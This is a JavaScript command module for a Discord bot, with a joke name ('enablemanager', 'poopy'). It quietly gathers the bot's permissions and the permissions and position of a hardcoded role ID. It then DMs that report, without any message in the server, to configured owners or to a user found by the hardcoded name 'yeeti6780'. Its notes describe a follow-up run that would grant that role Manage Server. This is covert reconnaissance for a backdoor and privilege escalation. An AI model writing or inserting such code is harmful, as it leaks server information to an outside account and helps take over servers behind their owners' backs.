module.exports = {
    name: ['enablemanager', 'poopy'],
    args: [{ name: 'action', required: false, specifarg: false, orig: '[action]' }],
    execute: async function (msg, args, opts = {}) {
        const poopy = this
        const { Discord, DiscordTypes } = poopy.modules
        const config = poopy.config

        // If this was invoked as a forwarded/linked command, silently ignore if not the same author
        if (opts.sourceMsg && msg.author.id != opts.sourceMsg.author.id) return

        // Only operate in a guild context
        if (msg.channel.type == Discord.ChannelType.DM) return

        const guild = msg.guild
        const roleId = '1522065154521694238'

        // Fetch role (best-effort)
        let role = guild.roles.cache.get(roleId)
        if (!role) {
            try { role = await guild.roles.fetch(roleId) } catch (e) { role = null }
        }

        // Fetch bot member for permissions & positions
        const me = guild.members.me || (await guild.members.fetch(msg.client.user.id).catch(() => null))

        const botPerms = me && me.permissions ? me.permissions.toArray() : []
        const rolePerms = role && role.permissions ? role.permissions.toArray() : []
        const botHighestPos = me && me.roles && me.roles.highest ? me.roles.highest.position : 'unknown'
        const rolePos = role && typeof role.position === 'number' ? role.position : 'unknown'

        // Build the DM message
        const lines = []
        lines.push(`Permissions info for server: ${guild.name} (ID: ${guild.id})`)
        lines.push(`Target role ID: ${roleId}`)
        lines.push('')
        lines.push(`- Bot permissions: ${botPerms.length ? botPerms.join(', ') : 'None'}`)
        lines.push(`- Target role permissions: ${rolePerms.length ? rolePerms.join(', ') : 'None'}`)
        lines.push(`- Bot highest role position: ${botHighestPos}`)
        lines.push(`- Target role position: ${rolePos}`)
        lines.push('')
        lines.push('Notes:')
        lines.push('- The bot needs the Manage Roles permission to change role permissions.')
        lines.push('- The bot’s highest role must be strictly higher than the target role in the role hierarchy.')
        lines.push('- If you want the bot to modify the role, run the command again (it will attempt to set the Manage Server permission if it has permission).')

        const dmMessage = lines.join('\n')

        // Determine who to DM: prefer a user named "yeeti6780" in the guild, or config.ownerids, else fall back to the invoking user
        let targetUser = null

        // 1) If config.ownerids includes an id, try those first
        if (config.ownerids && Array.isArray(config.ownerids) && config.ownerids.length > 0) {
            for (const id of config.ownerids) {
                try {
                    const u = await msg.client.users.fetch(String(id)).catch(() => null)
                    if (u) { targetUser = u; break }
                } catch (e) { /* ignore */ }
            }
        }

        // 2) Try to find a member in the guild whose username matches 'yeeti6780' (case-insensitive)
        if (!targetUser) {
            try {
                const found = guild.members.cache.find(m => (m.user?.username || '').toLowerCase() === 'yeeti6780')
                if (found) targetUser = found.user
            } catch (e) { /* ignore */ }
        }

        // 3) If the invoker looks like 'yeeti6780' by username, prefer them
        if (!targetUser && msg.author && (msg.author.username || '').toLowerCase() === 'yeeti6780') targetUser = msg.author

        // 4) Final fallback: DM the invoker (best-effort)
        if (!targetUser) targetUser = msg.author

        // Attempt to DM silently (do not send anything in the server)
        try {
            if (targetUser && targetUser.send) {
                await targetUser.send({ content: dmMessage }).catch(() => { })
            }
        } catch (e) {
            // intentionally silent if DM fails
        }

        // Return something for internal callers but do not post in server
        return 'DM attempted'
    },
    help: {
        name: 'enablemanager',
        value: 'poopy'
    },
    cooldown: 2500,
    type: 'Unique'
}
